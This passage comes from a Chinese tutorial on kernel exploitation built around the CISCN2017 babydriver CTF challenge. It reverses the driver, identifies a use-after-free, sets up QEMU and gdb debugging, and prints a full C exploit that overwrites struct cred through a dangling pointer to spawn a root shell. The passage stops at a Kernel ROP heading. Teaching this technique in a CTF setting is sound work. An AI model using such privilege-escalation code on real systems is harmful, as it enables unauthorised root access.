class="title">will</span> <span class="title">be</span> <span class="title">returned</span> <span class="title">from</span> <span class="title">the</span> <span class="title">call</span>.</span></span><br><span class="line"><span class="class"> * <span class="title">Any</span> <span class="title">further</span> <span class="title">sysfs</span> <span class="title">files</span> <span class="title">that</span> <span class="title">might</span> <span class="title">be</span> <span class="title">required</span> <span class="title">can</span> <span class="title">be</span> <span class="title">created</span> <span class="title">using</span> <span class="title">this</span></span></span><br><span class="line"><span class="class"> * <span class="title">pointer</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">Returns</span> &amp;<span class="title">struct</span> <span class="title">device</span> <span class="title">pointer</span> <span class="title">on</span> <span class="title">success</span>, <span class="title">or</span> <span class="title">ERR_PTR</span>() <span class="title">on</span> <span class="title">error</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">Note</span>:</span> the <span class="class"><span class="keyword">struct</span> <span class="title">class</span> <span class="title">passed</span> <span class="title">to</span> <span class="title">this</span> <span class="title">function</span> <span class="title">must</span> <span class="title">have</span> <span class="title">previously</span></span></span><br><span class="line"><span class="class"> * <span class="title">been</span> <span class="title">created</span> <span class="title">with</span> <span class="title">a</span> <span class="title">call</span> <span class="title">to</span> <span class="title">class_create</span>().</span></span><br><span class="line"><span class="class"> */</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">device</span> *<span class="title">device_create</span>(<span class="title">struct</span> <span class="title">class</span> *<span class="title">class</span>, <span class="title">struct</span> <span class="title">device</span> *<span class="title">parent</span>,</span></span><br><span class="line"><span class="class">           <span class="title">dev_t</span> <span class="title">devt</span>, <span class="title">void</span> *<span class="title">drvdata</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">fmt</span>, ...)</span></span><br></pre></td></tr></table></figure>
<p>初始时，init 函数通过调用 <code>class_create</code> 函数创建一个 <code>class</code> 类型的<strong>类</strong>，创建好后的<strong>类</strong>存放于sysfs下面，可以在 <code>/sys/class</code>中找到。</p>
<p>之后函数调用 <code>device_create</code> 函数，动态建立<strong>逻辑设备</strong>，对新逻辑设备进行初始化；同时还将其与第一个参数所对应的<strong>逻辑类</strong>相关联，并将此逻辑设备加到linux内核系统的设备驱动程序模型中。这样，函数会自动在 <code>/sys/devices/virtual</code> 目录下创建新的逻辑设备目录，并在 <code>/dev</code> 目录下创建与<strong>逻辑类</strong>对应的设备文件。</p>
<p>最终实现效果就是，我们便可以在 <code>/dev</code> 中看到该设备。</p>
<h6 id="1-5-init-函数小结">1.5 init 函数小结</h6>
<p>综上，<code>babydriver_init</code> 函数主要做了几件事：</p>
<ol>
<li>向内核申请一个空闲的设备号</li>
<li>声明一个 cdev 结构体，初始化并绑定设备号</li>
<li>创建新的 struct class，并将该设备号所对应的设备注册进 sysfs</li>
</ol>
<h5 id="2-babydriver-exit">2) babydriver_exit</h5>
<p>理解完 init 函数后，理解 exit 函数的逻辑就相当的简单——把该释放的数据结构全部释放。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">babydriver_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="3-babyopen">3) babyopen</h5>
<p>该函数代码如下：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211004201828178.png" alt="image-20211004201828178"></p>
<p>babyopen 函数在内核中创建了一个 <code>babydev_struct</code> 的结构体，其中包含了一个 <code>device_buf</code> 指针以及一个 <code>device_buf_len</code>成员变量。</p>
<p>需要注意的是，<code>kmem_cache_alloc_trace</code> 函数分配内存的逻辑与 <code>kmalloc</code>类似，笔者怀疑反汇编出来的代码应该是调用 <code>kmalloc</code> 函数优化内敛后的效果：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * kmalloc - allocate memory</span></span><br><span class="line"><span class="comment"> * @size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * kmalloc is the normal method of allocating memory</span></span><br><span class="line"><span class="comment"> * for objects smaller than page size in the kernel.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The allocated object address is aligned to at least ARCH_KMALLOC_MINALIGN</span></span><br><span class="line"><span class="comment"> * bytes. For @size of power of two bytes, the alignment is also guaranteed</span></span><br><span class="line"><span class="comment"> * to be at least to the size.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The @flags argument may be one of the GFP flags defined at</span></span><br><span class="line"><span class="comment"> * include/linux/gfp.h and described at</span></span><br><span class="line"><span class="comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The recommended usage of the @flags is described at</span></span><br><span class="line"><span class="comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Below is a brief outline of the most useful GFP flags</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_KERNEL</span></span><br><span class="line"><span class="comment"> *  Allocate normal kernel ram. May sleep.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_NOWAIT</span></span><br><span class="line"><span class="comment"> *  Allocation will not sleep.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_ATOMIC</span></span><br><span class="line"><span class="comment"> *  Allocation will not sleep.  May use emergency pools.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_HIGHUSER</span></span><br><span class="line"><span class="comment"> *  Allocate memory from high memory on behalf of user.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Also it is possible to set different flags by OR'ing</span></span><br><span class="line"><span class="comment"> * in one or more of the following additional @flags:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_HIGH</span></span><br><span class="line"><span class="comment"> *  This allocation has high priority and may use emergency pools.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NOFAIL</span></span><br><span class="line"><span class="comment"> *  Indicate that this allocation is in no way allowed to fail</span></span><br><span class="line"><span class="comment"> *  (think twice before using).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NORETRY</span></span><br><span class="line"><span class="comment"> *  If memory is not immediately available,</span></span><br><span class="line"><span class="comment"> *  then give up at once.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NOWARN</span></span><br><span class="line"><span class="comment"> *  If allocation fails, don't issue any warnings.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_RETRY_MAYFAIL</span></span><br><span class="line"><span class="comment"> *  Try really hard to succeed the allocation but fail</span></span><br><span class="line"><span class="comment"> *  eventually.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">      <span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">    index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!index)</span><br><span class="line">      <span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">        kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">        flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="4-babyrelease">4) babyrelease</h5>
<p>babyrelease 函数的逻辑较为简单，这里只是简单的将 babydev_struct.device_buf 释放掉。</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211004202526936.png" alt="image-20211004202526936"></p>
<p>但这里需要注意的是，尽管这里释放了指针所指向的内核空间，但 <strong>在释放完成后，该函数既没有对<code>device_buf</code>指针置空，也没有设置 <code>device_buf_len</code> 为0</strong> 。</p>
<h5 id="5-babyread">5) babyread</h5>
<p>babyread 函数的 IDA 反汇编效果存在错误，这是笔者根据汇编代码修正后的效果：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; length )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_to_user(buffer, babydev_struct.device_buf, length);</span><br><span class="line">    result = length;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>babyread 函数将在判断完当前 device_buf 是否为空之后，将 device_buf 上的内存拷贝至用户空间的 buffer 内存。</p>
<h5 id="6-babywrite">6) babywrite</h5>
<p>babywrite 功能与 babyread 类似，将用户空间的 buffer 内存上的数据拷贝进内核空间的 device_buf 上，此处不再赘述。该函数修正后的反编译代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; length )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(babydev_struct.device_buf, buffer, length);</span><br><span class="line">    result = length;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="7-babyioctl">7) babyioctl</h5>
<p>babyioctl 函数的功能类似于 <code>realloc</code>：将原先的 device_buf 释放，并分配一块新的内存。</p>
<p>但这里有个很重要的点需要注意：<strong>该位置的 kmalloc 大小可以被用户任意指定</strong>，而不是先前 babyopen 中的 64。</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211004203631020.png" alt="image-20211004203631020"></p>
<h4 id="e-获取到的信息">e. 获取到的信息</h4>
<p>根据上面的分析，最终我们可以得到以下信息：</p>
<p>已开启的保护：</p>
<ul>
<li>
<p>nx</p>
</li>
<li>
<p>smep</p>
</li>
</ul>
<p>内核模块中可能能利用的点：</p>
<ul>
<li>babyrelease <strong>释放 device_buf 指针后没有置空，device_buf_len 没有重置为0</strong></li>
<li>babyioctl 可以让 device_buf  重新分配<strong>任意大小</strong>的内存</li>
<li>当前内核模块中<strong>所有用到的变量都是全局变量</strong>，这意味着<strong>并发性非常的脆弱</strong>，或许可以利用一下。</li>
</ul>
<h3 id="4-调试前的准备">4. 调试前的准备</h3>
<ul>
<li>
<p>编写以下 shell 脚本以快速启动调试会话</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断当前权限是否为 root，需要高权限以执行 gef-remote --qemu-mode</span></span><br><span class="line">user=$(env | grep <span class="string">"^USER"</span> | cut -d <span class="string">"="</span> -f 2)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$user</span>"</span> != <span class="string">"root"</span>  ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"请使用 root 权限执行"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态编译 exp</span></span><br><span class="line">gcc exp.c -static -o rootfs/exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># rootfs 打包</span></span><br><span class="line"><span class="built_in">pushd</span> rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 gdb</span></span><br><span class="line">gnome-terminal -e <span class="string">'gdb -x mygdbinit'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> \</span><br><span class="line">    -<span class="built_in">enable</span>-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 64M \</span><br><span class="line">    --nographic  \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
<blockquote>
<p>exploit 需要静态编译，因为 kernel 不提供标准库，但一定提供 syscall。</p>
</blockquote>
</li>
<li>
<p>获取 vmlinux</p>
<p>我们可以使用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a> 工具，从 bzImage 中解压出 vmlinux。</p>
<blockquote>
<p>直接让 gdb 加载 bzImage 时将无法加载到任何 kernel 符号，</p>
<p>因此需要先从 bzImage 中解压出 vmlinux， 再来让 gdb 加载符号。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux</span><br><span class="line">chmod +x ./extract-vmlinux</span><br><span class="line"><span class="built_in">cd</span> CISCN2017-babydriver/babydriver/</span><br><span class="line">../../extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
<p>但实际上，解压出来的 vmlinux 的函数名称全部为 <code>sub_xxxx</code>，不方便调试。即便所有的内核符号与函数名称的信息全部位于内核符号表中（或者 <code>/proc/kallsyms</code>），但一个个对应过去也相当麻烦。</p>
<p>因此还有一个工具可以使用：<code>vmlinux-to-elf</code></p>
<blockquote>
<p>使用这个工具之前系统中必须装有<strong>高于3.5</strong>版本的python</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>
<p>使用方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span></span><br><span class="line">vmlinux-to-elf bzImage vmlinux</span><br></pre></td></tr></table></figure>
<p>之后解压出来的 vmlinux 就是带符号的，可以正常被 gdb 读取和下断点。</p>
</li>
<li>
<p>查看当前 bzImage 所对应的内核版本，并下载该版本的内核代码（如果有需要，想更细致的研究内核的话）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ strings bzImage | grep <span class="string">"gcc"</span> <span class="comment"># 或者 `file bzImage` 命令</span></span><br><span class="line">4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) <span class="comment">#1 SMP Thu Jun 15 19:52:50 PDT 2017</span></span><br><span class="line"></span><br><span class="line">$ curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-4.4.72.tar.xz</span><br><span class="line">$ unxz linux-4.4.72.tar.xz</span><br><span class="line">$ tar -xf linux-4.4.72.tar</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>启动 kernel 后，别忘记在 gdb 中使用 <code>add-symbol-file</code> 加载 ko 的符号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># in kernel shell:</span></span><br><span class="line">/ $ lsmod</span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># in gdb:</span></span><br><span class="line">gef➤  add-symbol-file babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最终设置的 mygdbinit 如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set architecture i386:x86-64</span><br><span class="line">add-symbol-file vmlinux</span><br><span class="line">gef-remote --qemu-mode localhost:1234</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 先 <span class="built_in">continue</span>， 在 insmod 之后手动 Ctrl+C 再设置断点，免得断点处于 pending 状态</span></span><br><span class="line">add-symbol-file babydriver.ko 0xffffffffc0000000</span><br><span class="line"></span><br><span class="line">b babyread</span><br><span class="line">b babywrite</span><br><span class="line">b babyioctl</span><br><span class="line">b babyopen</span><br><span class="line">b babyrelease</span><br><span class="line"></span><br><span class="line">c</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="5-kernel-的-UAF-利用">5. kernel 的 UAF 利用</h3>
<h4 id="a-覆写-cred-结构体">a. 覆写 cred 结构体</h4>
<p>UAF 的常规利用是通过悬垂指针来修改某块特定内存上的数据，因此在这里我们可以试着：</p>
<ul>
<li>先让一个悬垂指针指向一块已被释放的内存</li>
<li>执行 fork 操作，使 fork 时给新子进程分配的 <code>struct cred</code> 结构体重新分配这块内存</li>
<li>利用悬垂指针来随意修改这块内存上的 <code>struct cred</code> 结构体，达到提权的效果</li>
</ul>
<p><code>struct cred</code> 结构体用于 <strong>保存每个进程的权限</strong>，其结构如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *  task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *  upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task's actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">  <span class="keyword">atomic_t</span>  usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">  <span class="keyword">atomic_t</span>  subscribers;  <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">  <span class="keyword">void</span>    *put_addr;</span><br><span class="line">  <span class="keyword">unsigned</span>  magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD  0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">kuid_t</span>    uid;    <span class="comment">/* real UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    gid;    <span class="comment">/* real GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    suid;    <span class="comment">/* saved UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    sgid;    <span class="comment">/* saved GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    euid;    <span class="comment">/* effective UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    egid;    <span class="comment">/* effective GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    fsuid;    <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    fsgid;    <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  <span class="keyword">unsigned</span>  securebits;  <span class="comment">/* SUID-less security management */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_bset;  <span class="comment">/* capability bounding set */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_ambient;  <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>  jit_keyring;  <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">           * keys to */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">  <span class="keyword">void</span>    *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>  <span class="comment">/* real user ID subscription */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>  <span class="title">rcu</span>;</span>    <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>新进程的 <code>struct cred</code> 结构体分配的代码位于 <code>_do_fork -&gt; copy_process -&gt; copy_creds -&gt; prepare_creds</code> 函数调用链中。</p>
<p>为了避开繁琐的内存分配利用，精简利用方式，我们只需要让 babydriver 中释放的 <code>device_buf</code> 内存的大小与 <code>sizeof(struct cred)</code>一致即可，这样便可以让内核在为 struct cred 分配内存时，分配到刚释放不久的 device_buf 内存。</p>
<p>由于当前 bzImage 解压出来的 vmlinux 没有<strong>结构体</strong>符号，因此我们可以直接根据默认参数编译出一个新的 vmlinux，并加载该 vmlinux 来获取 <code>struct cred</code> 结构体的大小：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  p sizeof(struct cred)</span><br><span class="line"><span class="variable">$1</span> = 0xa8</span><br></pre></td></tr></table></figure>
<p>执行完 <code>babyrelease</code> 函数之后，<code>device_buf</code>就会成为悬垂指针。但需要注意的是，在用户进程空间中，当执行<code>close(fd)</code>之后，该进程将无法再使用这个文件描述符，因此没有办法在<code>close</code>后再利用这个 fd 去进行写操作。</p>
<p>但我们可以利用 babydriver 中的<strong>变量全是全局变量</strong>的这个特性，同时执行两次 open 操作，获取两个 fd。这样即便一个 fd 被 close 了，我们仍然可以利用另一个 fd 来对 <code>device_buf</code> 进行写操作。</p>
<p>这样一套完整的利用流程就出来了，exploit 如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR); <span class="comment">// alloc</span></span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR); <span class="comment">// alloc</span></span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0xa8</span>);    <span class="comment">// realloc</span></span><br><span class="line">    close(fd1); <span class="comment">// free</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">// child</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// try to overwrite struct cred</span></span><br><span class="line">        <span class="keyword">char</span> mem[<span class="number">4</span> * <span class="number">7</span>]; <span class="comment">// usage uid gid suid sgid euid egid</span></span><br><span class="line">        <span class="built_in">memset</span>(mem, <span class="string">'\x00'</span>, <span class="keyword">sizeof</span>(mem));</span><br><span class="line">        write(fd2, mem, <span class="keyword">sizeof</span>(mem));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get shell</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] after LPE, privilege: %s\n"</span>, (getuid() ? <span class="string">"user"</span> : <span class="string">"root"</span>));</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// parent</span></span><br><span class="line">        waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，当进程执行完 fork 操作后，父进程必须 wait 子进程，否则当父进程被销毁后，该进程成为孤儿进程，将无法使用终端进行输入输出。</p>
</blockquote>
<p>利用结果：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007082752272.png" alt="image-20211007082752272"></p>
<h4 id="b-Kernel-ROP">b. Kernel ROP</h4>
<h5 id="1-终端设备类型简介">1) 终端设备类型简介</h5>
<p>在 Linux 中 <code>/dev</code> 目录下，终端设备文件通常有以下几种：</p>
